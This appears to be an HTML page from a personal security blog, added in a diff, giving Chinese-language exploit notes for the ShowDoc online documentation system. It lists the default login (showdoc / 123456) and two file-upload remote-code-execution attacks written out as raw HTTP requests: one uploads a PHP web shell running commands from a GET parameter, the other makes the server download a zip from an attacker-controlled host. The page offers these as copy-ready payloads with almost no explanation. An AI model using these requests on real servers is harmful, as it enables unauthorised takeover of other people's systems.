@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>showdoc - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "showdoc", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../smartbi/smartbi/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../smartbi/smartbi/" class="btn btn-xs btn-link">
+        smartbi
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../openfire/openfire/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../openfire/openfire/" class="btn btn-xs btn-link">
+        openfire
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="showdoc">showdoc</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#默认密码">默认密码</a></li>
+<li><a href="#文件上传rce-1">文件上传rce 1</a></li>
+<li><a href="#文件上传rce-2">文件上传rce 2</a></li>
+</ul>
+<p>ShowDoc是一种在线文档系统，它可以帮助团队或个人快速创建、共享和管理文档</p>
+<h3 id="_2">默认密码</h3>
+<p>默认用户名showdoc，默认密码<strong>123456</strong>)</p>
+<h3 id="rce-1">文件上传rce 1</h3>
+<p>ShowDoc &lt; V2.8.3</p>
+<pre><code class="language-纯文本">POST /index.php?s=/home/page/uploadImg HTTP/1.1
+Host: xxx.xxx.xxx.xxx:port
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
+Content-Length: 262
+
+----------------------------921378126371623762173617
+Content-Disposition: form-data; name=&quot;editormd-image-file&quot;; filename=&quot;test.&lt;&gt;php&quot;
+Content-Type: text/plain
+
+&lt;?php echo '123_test';@eval($_GET[cmd])?&gt;
+----------------------------921378126371623762173617--
+</code></pre>
+<h3 id="rce-2">文件上传rce 2</h3>
+<p>ShowDoc &lt; V2.9.5</p>
+<p><img alt="" src="../image/image_3w2hAEpO0l.png" /></p>
+<pre><code class="language-纯文本">POST /server/index.php?s=/api/adminUpdate/download
+
+file_url=http://xxx.xxx.xxx:8888/showdoc-2.zip&amp;new_version=2
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../smartbi/smartbi/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../smartbi/smartbi/" class="btn btn-xs btn-link">
+        smartbi
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../openfire/openfire/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../openfire/openfire/" class="btn btn-xs btn-link">
+        openfire
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
